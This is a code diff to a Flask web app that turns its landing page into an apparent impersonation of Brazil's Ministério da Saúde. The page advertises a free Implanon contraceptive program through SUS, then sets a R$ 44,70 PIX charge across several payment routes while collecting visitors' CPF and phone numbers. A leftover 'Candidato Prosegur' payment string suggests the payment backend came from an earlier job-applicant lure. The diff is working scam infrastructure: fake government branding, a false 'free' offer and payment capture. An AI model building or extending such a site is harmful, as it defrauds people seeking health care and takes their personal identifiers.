@@ -76,13 +76,48 @@ def serve_font(filename):
     return send_from_directory('static/fonts', filename)
 
 @app.route("/")
-@simple_mobile_only
-@performance_monitor
 def index():
-    return render_template("index.html")
+    return """
+    <!DOCTYPE html>
+    <html lang="pt-BR">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Ministério da Saúde - Programa Implanon</title>
+        <script src="https://cdn.tailwindcss.com"></script>
+    </head>
+    <body class="bg-gray-100">
+        <header class="bg-gray-800 text-white p-4">
+            <div class="container mx-auto">
+                <h1 class="text-2xl font-bold">Ministério da Saúde</h1>
+                <p class="text-sm">Programa Implanon Gratuito</p>
+            </div>
+        </header>
+        <main class="container mx-auto p-4">
+            <h2 class="text-3xl font-bold mb-4">Programa Implanon Gratuito</h2>
+            <p class="text-lg mb-4">
+                Cadastre-se agora no programa gratuito do Implanon pelo SUS. 
+                O implante contraceptivo que normalmente custa R$ 1.800 - R$ 4.000 
+                agora está disponível gratuitamente.
+            </p>
+            <div class="bg-yellow-100 p-4 rounded-lg mb-4">
+                <h3 class="font-bold">Importante:</h3>
+                <p>• Hospitais públicos: vagas disponíveis a partir de maio/2026</p>
+                <p>• Clínicas conveniadas: disponibilidade imediata por R$ 44,70</p>
+            </div>
+            <button class="bg-blue-600 text-white px-6 py-3 rounded-lg font-bold">
+                Cadastrar Agora
+            </button>
+        </main>
+    </body>
+    </html>
+    """
+
+@app.route("/test")
+def test():
+    return "<h1>Test page working!</h1>"
 
 @app.route("/vagas")
-@simple_mobile_only
 @performance_monitor
 def vagas():
     return render_template("vagas.html")
@@ -453,7 +488,7 @@ def create_pix_payment():
             'email': user_data.get('email') or f"{user_data.get('name', '').lower().replace(' ', '')}@candidato.com.br",
             'cpf': user_data.get('cpf'),    # OBRIGATÓRIO do index  
             'phone': user_data.get('phone') or '11999999999',  # OBRIGATÓRIO do index
-            'amount': 84.90
+            'amount': 44.70
         }
         
         app.logger.info(f"Creating payment with data: {payment_data}")
@@ -489,15 +524,15 @@ def create_pix_payment():
         mock_payment = {
             'id': f'test_payment_{datetime.now().strftime("%Y%m%d_%H%M%S")}',
             'pixCode': '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-42661417400052040000530398654047340540302BR59João Silva6009São Paulo62070503***630445D8',
-            'amount': 84.90,
+            'amount': 44.70,
             'status': 'pending'
         }
         session['payment_data'] = mock_payment
         
         # Track the mock sale
         try:
-            db_analytics.track_sale('João Silva', 84.90, '12345678901', mock_payment['id'])
-            analytics_tracker.track_sale('João Silva', 84.90)
+            db_analytics.track_sale('João Silva', 44.70, '12345678901', mock_payment['id'])
+            analytics_tracker.track_sale('João Silva', 44.70)
         except Exception:
             pass
             
@@ -540,7 +575,7 @@ def pagamento():
                 'email': 'pendente@aguardando.dados', 
                 'cpf': '00000000000',
                 'phone': '00000000000',
-                'amount': 84.90
+                'amount': 44.70
             }
             
             app.logger.info(f"Auto-generating payment with data: {payment_request_data}")
@@ -570,7 +605,7 @@ def pagamento():
             mock_payment = {
                 'id': f'auto_payment_{datetime.now().strftime("%Y%m%d_%H%M%S")}',
                 'pixCode': '00020126580014BR.GOV.BCB.PIX0136123e4567-e89b-12d3-a456-42661417400052040000530398654047340540302BR59Candidato Prosegur6009São Paulo62070503***630445D8',
-                'amount': 84.90,
+                'amount': 44.70,
                 'status': 'pending'
             }
             session['payment_data'] = mock_payment
@@ -688,7 +723,7 @@ def check_payment_status(transaction_id):
                 }
                 
                 purchase_data = {
-                    'amount': 84.90,
+                    'amount': 44.70,
                     'transaction_id': transaction_id,
                     'payment_method': 'PIX'
                 }
